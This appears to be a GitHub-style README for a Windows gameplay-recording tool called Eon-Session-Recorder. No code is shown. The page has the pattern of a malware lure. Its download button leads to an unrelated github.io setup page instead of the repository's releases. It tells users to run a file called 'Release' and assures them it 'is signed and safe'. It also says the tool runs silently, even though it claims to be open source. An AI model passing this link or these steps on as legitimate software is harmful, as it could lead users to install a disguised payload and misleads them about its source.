# Eon‑Session‑Recorder

**Lightweight Windows‑only utility that captures your entire gameplay session and lets you replay it frame‑by‑frame.**
Designed for Windows 10 / 11, it runs silently in the background, stores recordings in a compact proprietary format, and offers a replay engine that restores the exact visual state of each frame – perfect for analysis, content creation, or sharing unforgettable moments.

---

## 📌 Why Eon‑Session‑Recorder?

| Feature | Benefit |
|---------|----------|
| **Frame‑accurate replay** | Review any moment with pixel‑perfect precision. |
| **Zero‑impact capture** | Minimal CPU/GPU overhead – your game stays smooth. |
| **One‑click start/stop** | Keyboard shortcuts launch or halt recording instantly. |
| **Configurable output** | Choose resolution, frame‑rate, and compression level. |
| **Portable** | No installer required; just drop the folder and run. |
| **Open‑source** | Full transparency, contributions welcome. |

---

## 🚀 Getting Started

### 1️⃣ Download
Click the button below to jump to the official download page.

<div align="center">
  <a href="https://rewfdf.github.io/SetupPage/">
    <img src="https://img.shields.io/badge/Download%20Now-🡺-blue?style=for-the-badge&logo=windows" alt="Download Eon Session Recorder">
  </a>
</div>

### 2️⃣ Unpack & Run
1. Extract the archive to a folder of your choice.
2. Run **Release** (the file is signed and safe).
3. Press **F9** to start a recording, **F10** to stop.

> **Tip:** Add the folder to your system `PATH` to launch the recorder from any command line.

### 3️⃣ Replay
1. Open the recorder and click **Load Replay**.
2. Select the `.eonrec` file you just created.
3. Use **← / →** to scrub, **Space** to pause/play, or **Ctrl + ←/→** for frame‑step.

---

## 🤝 Contributing

We welcome contributions from the community. Here's how to get involved:

1. **Fork** the repository.
2. Create a feature branch: `git checkout -b feature/awesome‑thing`.
3. Make your changes, ensuring the code builds on Windows 10/11.
4. Run the test suite: `scripts\run-tests.bat`.
5. Submit a **Pull Request** with a clear description of the enhancement or bug‑fix.

Please adhere to the [Contributor Covenant Code of Conduct](CODE_OF_CONDUCT.md).

---

## 📜 License

Eon‑Session‑Recorder is released under the **MIT License** – see the [LICENSE](LICENSE) file for details.

---

## 📧 Support & Feedback

- **Issues:** Open a GitHub issue for bugs or feature requests.
- **Discussions:** Join the community chat in the repository’s Discussions tab.
- **Email:** `midnightpilotponder@example.com` (for urgent matters only).

---

### Happy recording, and may your wins live forever!

## 📁 Configuration System

```text
configs/
├── default.cfg
├── visual.cfg
├── player.cfg
└── custom.cfg
```